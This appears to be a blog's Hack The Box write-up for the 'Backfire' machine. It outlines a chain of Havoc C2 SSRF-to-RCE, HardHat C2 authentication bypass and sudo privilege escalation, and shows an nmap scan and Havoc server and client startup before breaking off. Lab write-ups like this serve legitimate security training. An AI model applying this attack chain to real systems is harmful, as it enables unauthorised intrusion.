<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Summary User Ilya: Havoc C2 Exploit: SSRF + RCE\nLateral mouvement to Sergej: HardHat C2 Exploit: Authentification bypass + RCE\nRoot: Sudo misconfiguration\nEnumeration Starting with an nmap scan, we can identify two web services, the one accessible on port 8000 catch our attention here.\n1 2 3 4 5 6 7 8 $ nmap 10.10.11.49 -Pn -v PORT STATE SERVICE 22/tcp open ssh 443/tcp open https 5000/tcp filtered upnp 7096/tcp filtered unknown 8000/tcp open http-alt User Ilya Exploit Havoc C2: SRF + RCE The directory listing exposed on the port 8000 allows us to retrieve two files:\n"><meta name=google-site-verification content="_edZRF0IDWDYusRcZIg0DI2uJdltrXcQrjY8Cq3BGog"><title>Backfire - Linux Medium - HTB Writeup</title><link rel=canonical href=https://01MI.github.io/p/backfire-htb-writeup-linux-medium/><link rel=stylesheet href=/scss/style.min.481cbb7e1882acfaafcc745ee8320d6e0f71f8bf6767492c6443af4246b45730.css><meta property='og:title' content="Backfire - Linux Medium - HTB Writeup"><meta property='og:description' content="Summary User Ilya: Havoc C2 Exploit: SSRF + RCE\nLateral mouvement to Sergej: HardHat C2 Exploit: Authentification bypass + RCE\nRoot: Sudo misconfiguration\nEnumeration Starting with an nmap scan, we can identify two web services, the one accessible on port 8000 catch our attention here.\n1 2 3 4 5 6 7 8 $ nmap 10.10.11.49 -Pn -v PORT STATE SERVICE 22/tcp open ssh 443/tcp open https 5000/tcp filtered upnp 7096/tcp filtered unknown 8000/tcp open http-alt User Ilya Exploit Havoc C2: SRF + RCE The directory listing exposed on the port 8000 allows us to retrieve two files:\n"><meta property='og:url' content='https://01MI.github.io/p/backfire-htb-writeup-linux-medium/'><meta property='og:site_name' content='01MI'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='SSRF'><meta property='article:tag' content='RCE'><meta property='article:tag' content='C2'><meta property='article:tag' content='Sudo misconfiguration'><meta property='article:published_time' content='2025-06-07T00:00:00+00:00'><meta property='article:modified_time' content='2025-06-07T00:00:00+00:00'><meta property='og:image' content='https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Backfire.PNG'><meta name=twitter:title content="Backfire - Linux Medium - HTB Writeup"><meta name=twitter:description content="Summary User Ilya: Havoc C2 Exploit: SSRF + RCE\nLateral mouvement to Sergej: HardHat C2 Exploit: Authentification bypass + RCE\nRoot: Sudo misconfiguration\nEnumeration Starting with an nmap scan, we can identify two web services, the one accessible on port 8000 catch our attention here.\n1 2 3 4 5 6 7 8 $ nmap 10.10.11.49 -Pn -v PORT STATE SERVICE 22/tcp open ssh 443/tcp open https 5000/tcp filtered upnp 7096/tcp filtered unknown 8000/tcp open http-alt User Ilya Exploit Havoc C2: SRF + RCE The directory listing exposed on the port 8000 allows us to retrieve two files:\n"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Backfire.PNG'><link rel="shortcut icon" href=/favicon.png><script async src="https://www.googletagmanager.com/gtag/js?id=G-6B3GS05WV6"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6B3GS05WV6")}</script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_f12a5bd269c1b82c.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>ğŸŒ¶ï¸</span></figure><div class=site-meta><h1 class=site-name><a href=/>01MI</a></h1><h2 class=site-description>Mostly writeups</h2></div></header><ol class=menu-social><li><a href=https://github.com/01MI target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/page/htb/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M4 8l8-5 8 5v8l-8 5-8-5z"/><path d="M12 12v8"/><path d="M4 8l8 5 8-5"/><path d="M4 16l8 5 8-5"/></svg>
<span>HTB Writeups</span></a></li><li><a href=/page/ctf/><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-swords"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M21 3v5l-11 9-4 4-3-3 4-4 9-11z"/><path d="M5 13l6 6"/><path d="M14.32 17.32 18 21l3-3-3.365-3.365"/><path d="M10 5.5 8 3H3v5l3 2.5"/></svg>
<span>CTF Writeups</span></a></li><li><a href=/page/misc/><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-news"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M16 6h3a1 1 0 011 1v11a2 2 0 01-4 0V5a1 1 0 00-1-1H5A1 1 0 004 5v12a3 3 0 003 3h11"/><path d="M8 8h4"/><path d="M8 12h4"/><path d="M8 16h4"/></svg>
<span>Misc</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=i18n-switch><svg class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg>
<select name=language title=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://01MI.github.io/ selected>ğŸ¥ English</option><option value=https://01MI.github.io/fr/>ğŸ¥ FranÃ§ais</option></select></li><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#summary>Summary</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#user-ilya>User Ilya</a><ol><li><a href=#exploit-havoc-c2-srf--rce>Exploit Havoc C2: SRF + RCE</a></li></ol></li><li><a href=#lateral-mouvement-sergej>Lateral mouvement: Sergej</a><ol><li><a href=#exploit-hardhat-c2-authentification-bypass--rce>Exploit HardHat C2: Authentification bypass + RCE</a></li></ol></li><li><a href=#root>Root</a><ol><li><a href=#sudo-misconfiguration>Sudo misconfiguration</a></li></ol></li><li><a href=#resources>Resources</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/backfire-htb-writeup-linux-medium/><img src=/p/backfire-htb-writeup-linux-medium/Backfire_hu_f3db28b2ac107da4.PNG srcset="/p/backfire-htb-writeup-linux-medium/Backfire_hu_f3db28b2ac107da4.PNG 800w, /p/backfire-htb-writeup-linux-medium/Backfire_hu_2c9c389765921151.PNG 1600w" width=800 height=134 loading=lazy alt="Featured image of post Backfire - Linux Medium - HTB Writeup"></a></div><div class=article-details><header class=article-category><a href=/categories/hack/ style=background-color:#8dc720;color:#fff>Hack the box
</a><a href=/categories/linux/ style=background-color:#ffd34f;color:#fff>Linux
</a><a href=/categories/medium/ style=background-color:#fbb03b;color:#fff>Medium</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/backfire-htb-writeup-linux-medium/>Backfire - Linux Medium - HTB Writeup</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Jun 07, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>8 minute read</time></div></footer></div></header><section class=article-content><h2 id=summary>Summary</h2><p>User Ilya: Havoc C2 Exploit: SSRF + RCE<br>Lateral mouvement to Sergej: HardHat C2 Exploit: Authentification bypass + RCE<br>Root: Sudo misconfiguration</p><h2 id=enumeration>Enumeration</h2><p>Starting with an nmap scan, we can identify two web services, the one accessible on port 8000 catch our attention here.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt>1
</span></span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=err>$</span> <span class=nx>nmap</span> <span class=mf>10.10.11.49</span> <span class=o>-</span><span class=nx>Pn</span> <span class=o>-</span><span class=nx>v</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>PORT</span>     <span class=nx>STATE</span>    <span class=nx>SERVICE</span>
</span></span><span class=line><span class=cl><span class=mi>22</span><span class=o>/</span><span class=nx>tcp</span>   <span class=nx>open</span>     <span class=nx>ssh</span>
</span></span><span class=line><span class=cl><span class=mi>443</span><span class=o>/</span><span class=nx>tcp</span>  <span class=nx>open</span>     <span class=nx>https</span>
</span></span><span class=line><span class=cl><span class=mi>5000</span><span class=o>/</span><span class=nx>tcp</span> <span class=nx>filtered</span> <span class=nx>upnp</span>
</span></span><span class=line><span class=cl><span class=mi>7096</span><span class=o>/</span><span class=nx>tcp</span> <span class=nx>filtered</span> <span class=nx>unknown</span>
</span></span><span class=line><span class=cl><span class=mi>8000</span><span class=o>/</span><span class=nx>tcp</span> <span class=nx>open</span>     <span class=nx>http</span><span class=o>-</span><span class=nx>alt</span></span></span></code></pre></td></tr></table></div></div><h2 id=user-ilya>User Ilya</h2><h3 id=exploit-havoc-c2-srf--rce>Exploit Havoc C2: SRF + RCE</h3><p>The directory listing exposed on the port 8000 allows us to retrieve two files:</p><ul><li><code>disable.tls.patch</code>: This file indicates that TLS is disabled for WebSocket management on port 40056, allowing an unsecure connection.</li><li><code>havoc.yaotl</code>: A configuration file for the <a class=link href=https://github.com/HavocFramework/Havoc target=_blank rel=noopener>Havoc</a> C2 framework.</li></ul><p><img src=/p/backfire-htb-writeup-linux-medium/DL-Backfire.PNG width=500 height=153 srcset="/p/backfire-htb-writeup-linux-medium/DL-Backfire_hu_eb374eaa37102dc2.PNG 480w, /p/backfire-htb-writeup-linux-medium/DL-Backfire_hu_5ec44830e48e9964.PNG 1024w" loading=lazy class=gallery-image data-flex-grow=326 data-flex-basis=784px></p><p>These files suggest that the exploitation will rely on one or more vulnerabilities related to the Havoc command and control (C2) server.</p><p>After some digging, we came across this exploit: <a class=link href=https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE target=_blank rel=noopener>https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE</a>.<br>This exploit combines two vulnerabilities:</p><ul><li>CVE-2024-41570, which exploits an SSRF flaw to open a TCP socket on the main server (teamserver) allowing data read/write.</li><li>A command injection that lets an authenticated user execute commands on that server.</li></ul><p>After installing the Havoc framework, we launch both the server and the client.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt> 1
</span></span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=err>$</span> <span class=p>.</span><span class=o>/</span><span class=nx>havoc</span> <span class=nx>server</span> <span class=o>--</span><span class=nx>verbose</span> <span class=o>--</span><span class=nx>debug</span> <span class=o>--</span><span class=nx>profile</span> <span class=o>/</span><span class=nx>home</span><span class=o>/</span><span class=nx>kali</span><span class=o>/</span><span class=nx>TÃ©lÃ©chargements</span><span class=o>/</span><span class=nx>havoc</span><span class=p>.</span><span class=nx>yaotl</span>
</span></span><span class=line><span class=cl>              <span class=nx>_______</span>           <span class=nx>_______</span>  <span class=nx>_______</span> 
</span></span><span class=line><span class=cl>    <span class=err>â”‚\</span>     <span class=o>/</span><span class=err>â”‚</span><span class=p>(</span>  <span class=nx>___</span>  <span class=p>)</span><span class=err>â”‚\</span>     <span class=o>/</span><span class=err>â”‚</span><span class=p>(</span>  <span class=nx>___</span>  <span class=p>)(</span>  <span class=nx>____</span> <span class=err>\</span>                                            
</span></span><span class=line><span class=cl>    <span class=err>â”‚</span> <span class=p>)</span>   <span class=p>(</span> <span class=err>â”‚â”‚</span> <span class=p>(</span>   <span class=p>)</span> <span class=err>â”‚â”‚</span> <span class=p>)</span>   <span class=p>(</span> <span class=err>â”‚â”‚</span> <span class=p>(</span>   <span class=p>)</span> <span class=err>â”‚â”‚</span> <span class=p>(</span>    <span class=err>\</span><span class=o>/</span>                                            
</span></span><span class=line><span class=cl>    <span class=err>â”‚</span> <span class=p>(</span><span class=nx>___</span><span class=p>)</span> <span class=err>â”‚â”‚</span> <span class=p>(</span><span class=nx>___</span><span class=p>)</span> <span class=err>â”‚â”‚</span> <span class=err>â”‚</span>   <span class=err>â”‚</span> <span class=err>â”‚â”‚</span> <span class=err>â”‚</span>   <span class=err>â”‚</span> <span class=err>â”‚â”‚</span> <span class=err>â”‚</span>                                                  
</span></span><span class=line><span class=cl>    <span class=err>â”‚</span>  <span class=nx>___</span>  <span class=err>â”‚â”‚</span>  <span class=nx>___</span>  <span class=err>â”‚</span><span class=p>(</span> <span class=p>(</span>   <span class=p>)</span> <span class=p>)</span><span class=err>â”‚</span> <span class=err>â”‚</span>   <span class=err>â”‚</span> <span class=err>â”‚â”‚</span> <span class=err>â”‚</span>                                                  
</span></span><span class=line><span class=cl>    <span class=err>â”‚</span> <span class=p>(</span>   <span class=p>)</span> <span class=err>â”‚â”‚</span> <span class=p>(</span>   <span class=p>)</span> <span class=err>â”‚</span> <span class=err>\</span> <span class=err>\</span><span class=nx>_</span><span class=o>/</span> <span class=o>/</span> <span class=err>â”‚</span> <span class=err>â”‚</span>   <span class=err>â”‚</span> <span class=err>â”‚â”‚</span> <span class=err>â”‚</span>                                                  
</span></span><span class=line><span class=cl>    <span class=err>â”‚</span> <span class=p>)</span>   <span class=p>(</span> <span class=err>â”‚â”‚</span> <span class=p>)</span>   <span class=p>(</span> <span class=err>â”‚</span>  <span class=err>\</span>   <span class=o>/</span>  <span class=err>â”‚</span> <span class=p>(</span><span class=nx>___</span><span class=p>)</span> <span class=err>â”‚â”‚</span> <span class=p>(</span><span class=nx>____</span><span class=o>/</span><span class=err>\</span>                                            
</span></span><span class=line><span class=cl>    <span class=err>â”‚</span><span class=o>/</span>     <span class=err>\â”‚â”‚</span><span class=o>/</span>     <span class=err>\â”‚</span>   <span class=err>\</span><span class=nx>_</span><span class=o>/</span>   <span class=p>(</span><span class=nx>_______</span><span class=p>)(</span><span class=nx>_______</span><span class=o>/</span>                                            
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=nx>pwn</span> <span class=nx>and</span> <span class=nx>elevate</span> <span class=nx>until</span> <span class=nx>it</span><span class=err>&#39;</span><span class=nx>s</span> <span class=nx>done</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>47</span><span class=p>:</span><span class=mi>51</span><span class=p>]</span> <span class=p>[</span><span class=nx>DBUG</span><span class=p>]</span> <span class=p>[</span><span class=nx>cmd</span><span class=p>.</span><span class=nx>init</span><span class=p>.</span><span class=nx>func2</span><span class=p>:</span><span class=mi>59</span><span class=p>]:</span> <span class=nx>Debug</span> <span class=nx>mode</span> <span class=nx>enabled</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>47</span><span class=p>:</span><span class=mi>51</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Havoc</span> <span class=nx>Framework</span> <span class=p>[</span><span class=nx>Version</span><span class=p>:</span> <span class=mf>0.7</span><span class=p>]</span> <span class=p>[</span><span class=nx>CodeName</span><span class=p>:</span> <span class=nx>Bites</span> <span class=nx>The</span> <span class=nx>Dust</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>47</span><span class=p>:</span><span class=mi>51</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Havoc</span> <span class=nx>profile</span><span class=p>:</span> <span class=o>/</span><span class=nx>home</span><span class=o>/</span><span class=nx>kali</span><span class=o>/</span><span class=nx>TÃ©lÃ©chargements</span><span class=o>/</span><span class=nx>havoc</span><span class=p>.</span><span class=nx>yaotl</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>47</span><span class=p>:</span><span class=mi>51</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Build</span><span class=p>:</span> 
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>Compiler</span> <span class=nx>x64</span> <span class=p>:</span> <span class=nx>data</span><span class=o>/</span><span class=nx>x86_64</span><span class=o>-</span><span class=nx>w64</span><span class=o>-</span><span class=nx>mingw32</span><span class=o>-</span><span class=nx>cross</span><span class=o>/</span><span class=nx>bin</span><span class=o>/</span><span class=nx>x86_64</span><span class=o>-</span><span class=nx>w64</span><span class=o>-</span><span class=nx>mingw32</span><span class=o>-</span><span class=nx>gcc</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>Compiler</span> <span class=nx>x86</span> <span class=p>:</span> <span class=nx>data</span><span class=o>/</span><span class=nx>i686</span><span class=o>-</span><span class=nx>w64</span><span class=o>-</span><span class=nx>mingw32</span><span class=o>-</span><span class=nx>cross</span><span class=o>/</span><span class=nx>bin</span><span class=o>/</span><span class=nx>i686</span><span class=o>-</span><span class=nx>w64</span><span class=o>-</span><span class=nx>mingw32</span><span class=o>-</span><span class=nx>gcc</span>
</span></span><span class=line><span class=cl> <span class=o>-</span> <span class=nx>Nasm</span>         <span class=p>:</span> <span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>bin</span><span class=o>/</span><span class=nx>nasm</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>47</span><span class=p>:</span><span class=mi>51</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Time</span><span class=p>:</span> <span class=mo>04</span><span class=o>/</span><span class=mo>06</span><span class=o>/</span><span class=mi>2025</span> <span class=mi>12</span><span class=p>:</span><span class=mi>47</span><span class=p>:</span><span class=mi>51</span>
</span></span><span class=line><span class=cl><span class=o>...</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/backfire-htb-writeup-linux-medium/Client-Havoc.png width=505 height=288 srcset="/p/backfire-htb-writeup-linux-medium/Client-Havoc_hu_d59ee651e3ee545e.png 480w, /p/backfire-htb-writeup-linux-medium/Client-Havoc_hu_efc7451f6cb1d4b1.png 1024w" loading=lazy class=gallery-image data-flex-grow=175 data-flex-basis=420px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt> 1
</span></span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=err>$</span> <span class=p>.</span><span class=o>/</span><span class=nx>havoc</span> <span class=nx>client</span>
</span></span><span class=line><span class=cl>              <span class=nx>_______</span>           <span class=nx>_______</span>  <span class=nx>_______</span> 
</span></span><span class=line><span class=cl>    <span class=err>â”‚\</span>     <span class=o>/</span><span class=err>â”‚</span><span class=p>(</span>  <span class=nx>___</span>  <span class=p>)</span><span class=err>â”‚\</span>     <span class=o>/</span><span class=err>â”‚</span><span class=p>(</span>  <span class=nx>___</span>  <span class=p>)(</span>  <span class=nx>____</span> <span class=err>\</span>                                            
</span></span><span class=line><span class=cl>    <span class=err>â”‚</span> <span class=p>)</span>   <span class=p>(</span> <span class=err>â”‚â”‚</span> <span class=p>(</span>   <span class=p>)</span> <span class=err>â”‚â”‚</span> <span class=p>)</span>   <span class=p>(</span> <span class=err>â”‚â”‚</span> <span class=p>(</span>   <span class=p>)</span> <span class=err>â”‚â”‚</span> <span class=p>(</span>    <span class=err>\</span><span class=o>/</span>                                            
</span></span><span class=line><span class=cl>    <span class=err>â”‚</span> <span class=p>(</span><span class=nx>___</span><span class=p>)</span> <span class=err>â”‚â”‚</span> <span class=p>(</span><span class=nx>___</span><span class=p>)</span> <span class=err>â”‚â”‚</span> <span class=err>â”‚</span>   <span class=err>â”‚</span> <span class=err>â”‚â”‚</span> <span class=err>â”‚</span>   <span class=err>â”‚</span> <span class=err>â”‚â”‚</span> <span class=err>â”‚</span>                                                  
</span></span><span class=line><span class=cl>    <span class=err>â”‚</span>  <span class=nx>___</span>  <span class=err>â”‚â”‚</span>  <span class=nx>___</span>  <span class=err>â”‚</span><span class=p>(</span> <span class=p>(</span>   <span class=p>)</span> <span class=p>)</span><span class=err>â”‚</span> <span class=err>â”‚</span>   <span class=err>â”‚</span> <span class=err>â”‚â”‚</span> <span class=err>â”‚</span>                                                  
</span></span><span class=line><span class=cl>    <span class=err>â”‚</span> <span class=p>(</span>   <span class=p>)</span> <span class=err>â”‚â”‚</span> <span class=p>(</span>   <span class=p>)</span> <span class=err>â”‚</span> <span class=err>\</span> <span class=err>\</span><span class=nx>_</span><span class=o>/</span> <span class=o>/</span> <span class=err>â”‚</span> <span class=err>â”‚</span>   <span class=err>â”‚</span> <span class=err>â”‚â”‚</span> <span class=err>â”‚</span>                                                  
</span></span><span class=line><span class=cl>    <span class=err>â”‚</span> <span class=p>)</span>   <span class=p>(</span> <span class=err>â”‚â”‚</span> <span class=p>)</span>   <span class=p>(</span> <span class=err>â”‚</span>  <span class=err>\</span>   <span class=o>/</span>  <span class=err>â”‚</span> <span class=p>(</span><span class=nx>___</span><span class=p>)</span> <span class=err>â”‚â”‚</span> <span class=p>(</span><span class=nx>____</span><span class=o>/</span><span class=err>\</span>                                            
</span></span><span class=line><span class=cl>    <span class=err>â”‚</span><span class=o>/</span>     <span class=err>\â”‚â”‚</span><span class=o>/</span>     <span class=err>\â”‚</span>   <span class=err>\</span><span class=nx>_</span><span class=o>/</span>   <span class=p>(</span><span class=nx>_______</span><span class=p>)(</span><span class=nx>_______</span><span class=o>/</span>                                            
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=nx>pwn</span> <span class=nx>and</span> <span class=nx>elevate</span> <span class=nx>until</span> <span class=nx>it</span><span class=err>&#39;</span><span class=nx>s</span> <span class=nx>done</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>47</span><span class=p>:</span><span class=mi>53</span><span class=p>]</span> <span class=p>[</span><span class=nx>info</span><span class=p>]</span> <span class=nx>Havoc</span> <span class=nx>Framework</span> <span class=p>[</span><span class=nx>Version</span><span class=p>:</span> <span class=mf>0.7</span><span class=p>]</span> <span class=p>[</span><span class=nx>CodeName</span><span class=p>:</span> <span class=nx>Bites</span> <span class=nx>The</span> <span class=nx>Dust</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>47</span><span class=p>:</span><span class=mi>53</span><span class=p>]</span> <span class=p>[</span><span class=nx>info</span><span class=p>]</span> <span class=nx>loaded</span> <span class=nx>config</span> <span class=nx>file</span><span class=p>:</span> <span class=nx>client</span><span class=o>/</span><span class=nx>config</span><span class=p>.</span><span class=nx>toml</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>47</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>[</span><span class=nx>info</span><span class=p>]</span> <span class=nx>Connecting</span> <span class=nx>to</span> <span class=nx>profile</span><span class=p>:</span> <span class=nx>HTB</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=kt>string</span><span class=p>&gt;:</span><span class=mi>114</span><span class=p>:</span> <span class=nx>SyntaxWarning</span><span class=p>:</span> <span class=nx>invalid</span> <span class=nx>escape</span> <span class=nx>sequence</span> <span class=err>&#39;\</span><span class=nx>W</span><span class=err>&#39;</span>
